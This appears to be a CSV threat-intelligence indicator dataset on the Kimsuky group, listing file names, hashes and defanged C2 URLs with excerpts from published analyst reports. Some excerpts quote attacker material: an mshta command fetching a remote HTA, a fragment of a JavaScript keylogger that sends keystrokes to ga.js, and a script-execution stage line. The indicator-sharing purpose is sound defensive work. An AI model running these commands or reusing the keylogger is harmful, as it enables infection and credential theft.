1.0.0,actor--kimsuky,artifact--sha256:41919098450a29c6906c71b9e14c7d582500df2b62645ebb35c37ca1096d8cb6,observation--sha256:b592c8cbb5cc08f0f6097e927729e6d68da81a9a541e16c6274fc453230f1f70,file-name,expres.php,expres.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 8}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 2] Screen displayed after executing the malicious document written in Korean The malicious document contains files range from 'activeX1.bin' to 'activeX10.bin'. The file 'activeX2.bin' is the one that has the communication host addresses as follows, and it tries the additional C2 communication by means of HTA commands and conditions. - https://tdalpacafarm[.]com//wp-includes/Text/Diff/common/Htqgf0.hta - https://tdalpacafarm[.]com//wp-includes/Text/Diff/common/expres.php?op=1 - https://t",
1.0.0,actor--kimsuky,artifact--sha256:41919098450a29c6906c71b9e14c7d582500df2b62645ebb35c37ca1096d8cb6,observation--sha256:3b4285b0b0b0c122a0476f7aa399509ebd5d31a98b238c24afe1d578b527cf8c,file-name,expres.php,expres.php,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 9}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,[Figure 3] Code of 'activeX2.bin' file Another variant with the same name as the 'TaskForceReport.doc' (MD5: 0f77143ce98d0b9f69c802789e3b1713) file has been propagated in March. - https://christinadudley[.]com/public_html/includes/common/Qfnaq0.hta - https://christinadudley[.]com/public_html/includes/common/expres.php?op=1 - https://christinadudley[.]com/public_html/includes/common/cow.php?op=Normal.src - https://christinadudley[.]com/public_html/includes/common/Normal.src - https://christinadud,
1.0.0,actor--kimsuky,artifact--sha256:41919098450a29c6906c71b9e14c7d582500df2b62645ebb35c37ca1096d8cb6,observation--sha256:3e13c8e272afed2720366297a77ec09b7838c582e289791d6c5934cf0e06b9da,file-name,expres.php,expres.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--2712defa6fbe4d81,kimsuky/kimsuky-note.txt,"{""line"": 27}",[],[],[],[],1,false,medium,TLP:CLEAR,text-line,http://xxx/shop/price/com/expres.php?op=1,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:41919098450a29c6906c71b9e14c7d582500df2b62645ebb35c37ca1096d8cb6,observation--sha256:5fd75c7369ac0de2a4f5c2c5b03b11ef7eb4ddfe0dd677231f324139a127bda3,file-name,expres.php,expres.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--2712defa6fbe4d81,kimsuky/kimsuky-note.txt,"{""line"": 28}",[],[],[],[],1,false,medium,TLP:CLEAR,text-line,http://xxx/shop/kcp/js/com/expres.php?op=1,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:de401e6457d493497eb709e7cc252d76b31b99bd668c5134969b68fd243239ca,observation--sha256:78ab116e741e23ac13f87b80d576eadd27ae448bdd51182e21e286804a3229a5,file-name,fdx.php,fdx.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 58}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"There is an awkward phrase in the form of a question : “Do you need help?” And since you will never enter your Daum ID and password to check the delivery document, if you pay attention and check when you receive a phishing email similar to this, you may find awkward phrases or parts that do not match the content of the email, so you can prevent damage. . [+] FedEx Phishing C2: hxxps://elated-blackburn.5-252-21-33.plesk.page/fededmd/fdx.php 58 ÿ FedEx Phishing Phishing pages impersonating famous ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b3e58a87f4d152042c20c5b9d3ed325d1975c877beb1c244235f943de2502cc8,observation--sha256:20a4daab3009fb62f812de4962c55c15193bd4d456ce427484c5413081647642,file-name,first.hta,first.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 2}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"[Figure 1] E-mail disguised as government official's remarks about Korea-US Summit The threat actor attempts to trick users into opening the email titled “Government official's remarks about Korea-US Summit, with a malicious .hwp attachment named ‘Government official's remarks about Korea-US Summit.hwp’. As the distributed malicious hwp document file was encrypted, the EPS vulnerability could not be exploited without entering the password. When a document file vulnerability is triggered, it atte",
1.0.0,actor--kimsuky,artifact--sha256:b3e58a87f4d152042c20c5b9d3ed325d1975c877beb1c244235f943de2502cc8,observation--sha256:c45ff54c19a2698803a6d769391de08c10f7d5704c8d9a566fcb9ae7059d1ea8,file-name,first.hta,first.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 3}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,"Post0.Send: t0=Post0.responseText: Execute(t0) The malicious script code goes through stages 1-3 of the following steps, runs a PowerShell- based keylogger, and secretly collects information from the infected computer, then registers itself in the system registry to conduct espionage operations by communicating with its C2 server. - http://naban.co[.]kr/mobile/skin/member/ctml/v/first.hta - http://naban.co[.]kr/mobile/skin/member/ctml/v/expres.php?op=1 - http://naban.co[.]kr/mobile/skin/member/c",
1.0.0,actor--kimsuky,artifact--sha256:b3e58a87f4d152042c20c5b9d3ed325d1975c877beb1c244235f943de2502cc8,observation--sha256:2d592c96ee38a38bade1ade32e56ec999b93ef7fe32d16bd2425ecb8cf60b18a,file-name,first.hta,first.hta,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--2712defa6fbe4d81,kimsuky/kimsuky-note.txt,"{""line"": 26}",[],[],[],[],1,false,medium,TLP:CLEAR,text-line,mshta.exe http://xxx/shop/price/com/first.hta,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:57ee6b1ad0a7116b26702331c4fd295a6c007b58bf7933c511ae25d6ec62407c,observation--sha256:19041de7df63b00ee6addf73e52af9ef55814cc35a6fec3e6b56708fe338cce8,file-name,flower01.ps1,flower01.ps1,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9df25ac7166cf3e24c17d7b1829a9e3c173dc35d9a08d26a6337cdb3e66a2f73,observation--sha256:418ea9057fd5e3ce24c525e343224a5c666404561e1bb2677bc4bd7d6ed6ba13,file-name,fmaov0.hta,fmaov0.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 16}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- http://seoulhobi[.]biz/how/fmaov0.hta - http://192.186.142[.]74/cache/fwvuj0.hta - http://192.186.142[.]74/cache/expres.php?op=1 - http://192.186.142[.]74/cache/expres.php?op=2 - http://192.186.142[.]74/cache/cow.php?op=exe.gif - http://192.186.142[.]74/cache/cow.php?op=cow.gif - http://192.186.142[.]74/cache/upload.php - http://192.186.142[.]74/mn/xtgnb0.hta - http://192.186.142[.]74/post/Yluhi0.hta - http://192.186.142[.]74/dll/Mylqn0.hta - http://192.186.142[.]74/lib/szgfj0.hta - http://192,
1.0.0,actor--kimsuky,artifact--sha256:66d2e0a2f776f0bc268183ff679d8bc27523090af0d20d8c196692ab3d6639cb,observation--sha256:13b43dbd24b50c69e0d95fe3cb8d5b9018ffa12e4471ddaa32551b6f913eaa28,file-name,fooe.php,fooe.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--66d8611f88a6a292,kimsuky/Exploit Weak DMARC.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"FBI | State | NSA TLP:CLEAR Page 6 of 9 | Product ID: JCSA-20240502-001 JCSA-20240502-001 JCSA-502-001 TLP:CLEAR Sample Email Header 1: In the sample email header below, all referenced portions are highlighted. The email returns a “pass” for the corresponding SPF and DKIM checks, implying the North Korean actor was successful in gaining access to a university’s legitimate email client to send the email. The DMARC protocol returns as “fail” because the sender’s email domain—presented as the domai",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3ca156f23d542660e84423e11ef1d9e7f9f306ddd282758be31513422e30f76a,observation--sha256:8278e993c1f7ea18fcc8171cf76e9ce59960be148dea7afcb2277d19f46c6a4e,file-name,form.docx,form.docx,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 50}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"assembly.mypressonline.com koreailmin.atwebpages.com/file/notouch.php (Green Dinosaur webshell) Operation Covert Stalker Report (Table 22) C2 and structure of the same pattern koreailmin.mypressonline.com At koreaglobal.mywebcommunity.org, we discovered a malicious document (reimbursement payment form.docx) attached to a hacked email and the North Korean expression “ryondong.” The rule of induction is a phenomenon in which ""ÿ"" or ""ÿ"" is reluctant to appear at the beginning of a word. For example",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:d8feee923118e302f0d1eb1ea804d079f9dbba1cf8e16623caca56728b836199,observation--sha256:3593e37fc3a706133105e30ff6b5557b15116efe9efc58307975a82ea69d78e9,file-name,fox64.exe,fox64.exe,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 23}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"hxxps://www.nirsoft.net/utils/internet_explorer_password.html Dictionary assignment attack on a specific service account advanced_port_scanner_console.exe pspv.exe mspass.exe Scanners that can specify IP bands, specific ports, or port ranges Port scanner for specific ports by setting IP bands for each country Extract account information saved in Outlook, Internet Explorer, MSN Explorer Official site: hxxps://www.nirsoft.net/utils/pspv.html explanation advanced_port_scanner.exe netpass64.exe Oper",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:304145914f1ac8710c4859bd163d179461997c6a06ffb3e0a3506760e471fc87,observation--sha256:35b2ccc10232cfa4f566eea7d93e1a3cb7e6d2e8d55029a038f62778dbe43fc6,file-name,fwvuj0.hta,fwvuj0.hta,candidate,,unknown,unknown,not-stated,2019-04-17T00:00:00Z,source--smoke-screen,kimsuky/Smoke Screen.pdf,"{""page"": 16}","[""activity--smoke-screen""]",[],"[""infra--compromised-web-servers""]","[""c2"",""payload"",""phishing""]",1,false,high,TLP:CLEAR,pdf-text,- http://seoulhobi[.]biz/how/fmaov0.hta - http://192.186.142[.]74/cache/fwvuj0.hta - http://192.186.142[.]74/cache/expres.php?op=1 - http://192.186.142[.]74/cache/expres.php?op=2 - http://192.186.142[.]74/cache/cow.php?op=exe.gif - http://192.186.142[.]74/cache/cow.php?op=cow.gif - http://192.186.142[.]74/cache/upload.php - http://192.186.142[.]74/mn/xtgnb0.hta - http://192.186.142[.]74/post/Yluhi0.hta - http://192.186.142[.]74/dll/Mylqn0.hta - http://192.186.142[.]74/lib/szgfj0.hta - http://192,
1.0.0,actor--kimsuky,artifact--sha256:9065cfdf92c0a0e367958b00b88865774e3f976b454a197c5a6dbf6b6725d33f,observation--sha256:079795053ce251193dd62ec48f770a9774abb41e852aa6a28cf00dd83e1812db,file-name,g.php,g.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ Temp folder image File, Kakao (Daum) phishing mailer As a result of deactivation and analysis, malicious macros were present. (Analysis data) North Korea's position on the use of nuclear force as seen through the April 25 military parade and When executed, additional malicious code is downloaded and executed, and the structure is the same as ""(Figure 26) Malicious code infection process"" above . [+] Joint security advisory from the National Intelligence Service (NIS) and the German Office for ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9065cfdf92c0a0e367958b00b88865774e3f976b454a197c5a6dbf6b6725d33f,observation--sha256:2a5502d4057d66b1cb1975b6b3724d026309540a9273e15a4c4f1d778ae98948,file-name,g.php,g.php,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:9065cfdf92c0a0e367958b00b88865774e3f976b454a197c5a6dbf6b6725d33f,observation--sha256:a4bc4c27ad113c83e63d5b8cf1b5f028fe572bdf2c63d426b6fa9329b4336c03,file-name,g.php,g.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--85ca2c2dc29118d8,kimsuky/APTDown/phrack-apt-down-the-north-korea-files_.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"MAPT Down: The N o r t h Korea Files The Google Chrome conﬁguration ﬁles contain these links. Does KIM use (his?) google creds t o access these sites? Is w w h 1 0 0 4 his G i t H u b account? Did he use google-pay t o pay f o r the three VPN services? ""https://accounts.google.com:443, https://[*.]0x1.gitlab.io"": ""https://accounts.google.com:443, https://[*.]aldeid.com"": ""https://accounts.google.com:443, https://[*.Jasawicki.info"": ""https://accounts.google.com:443, https://[*.]devglan.com"": ""htt",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:6e67fcddbe9ad959ceed3835c8d49ab3bc4d1147ab608866da517929d0269c09,observation--sha256:0be7fde89aaef4eae25ccca8fdc80d5383b187e95c1d97610c2619dff90ca8e7,file-name,ga.js,ga.js,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 10}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 10 VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 01: analytics.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&delay=30&m=login After a warning window is displayed indicating that the session has been terminated and moving to the login page, it is disguised as if it has moved to the webmail login page (any page can be loaded through the iframe tag). The keylogging script works on the moved webmail disguised page, and the account",
1.0.0,actor--kimsuky,artifact--sha256:6e67fcddbe9ad959ceed3835c8d49ab3bc4d1147ab608866da517929d0269c09,observation--sha256:fb5450aea3fba424ac985f691cbe4956a946644424b600ca90927737975d3622,file-name,(ga.js,ga.js,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 11}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 11VIRUS BULLETIN CONFERENCE OCTOBER 2021 Stage 02: bootstrap.js?_=[BASE64(ID)]&token=[BASE64(Target)]=&m=login (Web page newly moved by iframe.) <script> </script><scripttype=""text/javascript""> $(function(){ functionsend(value=""""){ $.ajax({ url:""ga.js"", type:""post"", data:{ _:""[BASE64(ID)]"", token:btoa(value) } }); } $(""input"").keydown(function(evt) { send(""keydown:""+evt.target.value); }); $(""input"").change(function(evt) {",
1.0.0,actor--kimsuky,artifact--sha256:6e67fcddbe9ad959ceed3835c8d49ab3bc4d1147ab608866da517929d0269c09,observation--sha256:5ed02e3ea6aa170ccb59649b84988592a5a4e35878729479b15b25e31de986f3,file-name,ga.js,ga.js,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 9}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 9VIRUS BULLETIN CONFERENCE OCTOBER 2021 3.1 Phishing: spear-phishing link When browsing the email, it looks like it contains simple text (‘>> erroneous sending email’), but in fact it contains HTML code. One of the problems was that when the email was read on the webmail service, it was moved to the phishing page configured by the attacker.  Mailing Toolkit (phishing email sending URL): wallet-info.esy.es/mail_ok.php  S",
1.0.0,actor--kimsuky,artifact--sha256:07db025570777f2785aff3a9acd7b1d9c1d6fb1f5322e4684a82e5da996d73b7,observation--sha256:f309c3292ab66db927401b58624b6af2cf0269c7cc138ad5e953ed0d7d401edb,file-name,gamelist.php,gamelist.php,candidate,2022-05-13T00:00:00Z,day,known,same-record,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 57}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4.11. C2도메인유사도 ○C2 도메인에서도유사도를확인할수있으며, VBS 1 / JSE 1 유형의도메인은작년5월안랩에서공개한Kimsuky보고서 의C2도메인과유사한형태가사용됐었습니다. 10 ○JSE 1 유형부터는C2 도메인형태에변화가있었고이후유형들은기존의Kimsuky도메인유형과는달라졌으며, 점차단순화되는형태를띄고있습니다. [표4-5] C2도메인유사도 10 Ahnlab- 다양한주제의보도자료를사칭한Kimsuky공격시도 Genians SecurityCenter 56 유형 날짜 C2Domain Kimsuky 2022-05-13 mc[.]pzs.kr/themes/mobile/images/about/temp/upload/list.php?query=1 VBS1 2022-02-09 sktelecom[.]help/download/select.php?type=12022-03-15 encorpost[.]com/post/post.php?type=12022-0",
1.0.0,actor--kimsuky,artifact--sha256:cd5cc88b006b2e29ee1a598b13c370cf5c2c24bbca8a8161e79840b4c24ec865,observation--sha256:0075219b835b932399f1a8f64ec3a4efecbee007c68d9034ee1d5380fbdeaac0,file-name,gb.js,gb.js,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 36}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"ÿ May 2023, 183.111.100.193(KR) Cook folder, files required for malware operation, and Google Chrome Extension stored index.php, index_.php, index1.php files, phishing proxy page ÿ March 2023, domestic stopover (KR) Yahoo Stores gb.js, ja.js, ko.js, etc. required for folder and phishing URL operation. ÿ September 2022, 185.176.43.106(BG) Operation Covert Stalker Report The process by which the Kimsuky organization sends phishing emails is summarized as shown below (Figure 23). URL ÿ Yahoo folder",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c35a407e0fc50c8432a246f7e5c580ca3d6d60bf3dfa637b6b86bf554d1ceb8c,observation--sha256:8c9c880bb00b9d31f9edee7d6f88a56c367882d486b1c07bc8f550d02585699e,file-name,generator.php,generator.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 154}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,- See fish-url.txt & generator.php to learn about password re-use patterns.,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c35a407e0fc50c8432a246f7e5c580ca3d6d60bf3dfa637b6b86bf554d1ceb8c,observation--sha256:2a6baf6bdd8bec48b508dde9ad370207ef536b5f938ba307bd2ada3b43a21b10,file-name,generator.php,generator.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 399}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,-[ generator.php:,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c35a407e0fc50c8432a246f7e5c580ca3d6d60bf3dfa637b6b86bf554d1ceb8c,observation--sha256:43d294a5eb22b673ba961859132d156f491518a470fc5c7e536d5cecd0756172,file-name,generator.php,generator.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 406}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,"curl -v --cookie ""HnoplYTfPX=x"" https://phishing-site/generator.php",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:c35a407e0fc50c8432a246f7e5c580ca3d6d60bf3dfa637b6b86bf554d1ceb8c,observation--sha256:f6b4463456575e1b4b09e1a59eee0db6b414212858c38a0f42c61192cc8cfa54,file-name,generator.php,generator.php,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--85ca2c2dc29118d8,kimsuky/APTDown/phrack-apt-down-the-north-korea-files_.pdf,"{""page"": 5}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"MAPT Down: The N o r t h Korea Files The Google Chrome conﬁguration ﬁles contain these links. Does KIM use (his?) google creds t o access these sites? Is w w h 1 0 0 4 his G i t H u b account? Did he use google-pay t o pay f o r the three VPN services? ""https://accounts.google.com:443, https://[*.]0x1.gitlab.io"": ""https://accounts.google.com:443, https://[*.]aldeid.com"": ""https://accounts.google.com:443, https://[*.Jasawicki.info"": ""https://accounts.google.com:443, https://[*.]devglan.com"": ""htt",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:3c0d10e4102ac2112e7a744431ee1d8b4ee3afdb321a95c0988797a8b9986a84,observation--sha256:769bd4ff2b160687c775c6be9b0cd76ca7f3eec7b5fc4f4289e9275321458ccd,file-name,gpki.7z,gpki.7z,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--030e0bafc14e2552,kimsuky/APTDown/article.txt,"{""line"": 294}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,- gpki.7z = government-PKI: contains internal data about the South Korean,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:b6ced3b81dddfb627dfb532069ccfd37ed202755cc2ac7692a47dd432f734c10,observation--sha256:13aa0ee5d279b9418c69ba1aa9f9766afa842e642356aa86bafeae7773804db6,file-name,hh.exe,hh.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 11}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 3.2. sgic_info.html ○CHM파일을실행할경우, 내부에포함되어있는HTML파일이실행됩니다.이때, HTML파일의하단에존재하는악성스크립트가윈도우도움말실행프로그램인hh.exe 를통해CHM파일을“C:\Users\Public\Libraries” 경로에디컴파일합니다. 이후, 디컴파일을통해추출된악성Docs.jse파일을wscript.exe 로실행합니다. [그림3-4] HTML내부스크립트 [그림3-5] 디컴파일탐지 Genians SecurityCenter 10",
1.0.0,actor--kimsuky,artifact--sha256:b6ced3b81dddfb627dfb532069ccfd37ed202755cc2ac7692a47dd432f734c10,observation--sha256:f05897dbfb9c152dd3aca789f3b1a6e30f4595d44ca1b686c860bcf06eb62a1c,file-name,hh.exe,hh.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 42}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,Threat IntelligenceReport ○JSE 2 유형은이전유형들과다르게HTML 파일내부에BASE64 로인코딩된악성스크립트가 존재하지 않습니다. 대신 hh.exe 의 디컴파일 명령어를 통해 CHM 파일내부에컴파일된악성JSE파일을드롭한다는특징을가지고있습니다. [그림4-16] JSE2유형의HTML코드 Genians SecurityCenter 41,
1.0.0,actor--kimsuky,artifact--sha256:b6ced3b81dddfb627dfb532069ccfd37ed202755cc2ac7692a47dd432f734c10,observation--sha256:fd7043af223120294b128a61096942b405d2c46648972dc98dd0660b6c22a611,file-name,hh.exe,hh.exe,candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 43}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○hh.exe 통해CHM파일을디컴파일할경우, HTML 파일과함께컴파일된파일이추출됩니다. 해당 CHM 파일에는 JSE 파일이 함께 컴파일되어 있으며, 디컴파일 시HTML, JSE파일이추출됩니다. ○JSE 2 유형부터는JSE 파일내부코드를“+” 기호로분리했으며, 이는보안솔루션의탐지를피하기위한방법으로보입니다. [그림4-17] JSE2유형의JSE파일 Genians SecurityCenter 42",
1.0.0,actor--kimsuky,artifact--sha256:47785b44de02e6028156ea40aeff3106a56903fe4f703722bf96c93350e982e9,observation--sha256:37a9472a16c5bacb0241f76630f3e890cf9f1ecef87cc388a4f4dc7498dd0824,file-name,hncupdate.exe,hncupdate.exe,candidate,2021-08-17T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 8}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 8 RdpAttack_Zooho01.exe index(2).php n.php bcb95b956007b883e169ea1b7e03e5f1 test.php a602b4320bf412e100640a712a924545 enc.txt HackTool/Win.RdpScan (2021.08.17.03) af84eb2462e0b47d9595c21cf0e623a5 Trojan/Script.Agent.SC193444 (2023.10.19.00) 9cdda333432f403b408b9fe717163861 b393929b8b9c13083a015fb135887600 normal_sc(2).txt hncupdate.exe index_.php ceda3fe64e97c9c66e4934bcd619925d adcdc64be39551856c806e1c962350ff beb07a3614a5eb0a55f49a85f6fc7d6d 9b60ea2ea5b43f8fe178,Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ebdb8ff325657128f79dcf0e25fdcdb90a5716c1abfa0abd6b8474a6c5b2bdbd,observation--sha256:4cc26e5c69df595252015083642d5e83e53ade26c8db4c91a81ed83047f33268,file-name,home.php,home.php,candidate,2022-09-30T00:00:00Z,day,known,same-record,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 6}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Operation Covert Stalker Report 6 HackTool/PHP.Mailer.SC183661 (2022.09.30.03) 08a3e160fd44794347c3d7c01845efad Trojan/Win32.Agent (2018.06.19.00) Trojan/Script.Agent.SC193447 (2023.10.19.00) 526ed4e59c3931374f59b326e8ec2a25 HackTool/Win.RdpScan (2021.08.17.03) HackTool/Win.RdpScan (2021.08.17.03) RdpScan_La_1226.exe cc.exe RdpScan_Ksb04.exe Trojan/Script.Agent.SC193448 (2023.10.19.00) info_sc.txt Dropper/Win.Agent (2023.10.20.00) click.php 23447a412c08aa05d41fb321bb2a085a [KBS Sunday Diagnosis],Actor-directory corpus sweep; ambiguous values remain candidates.
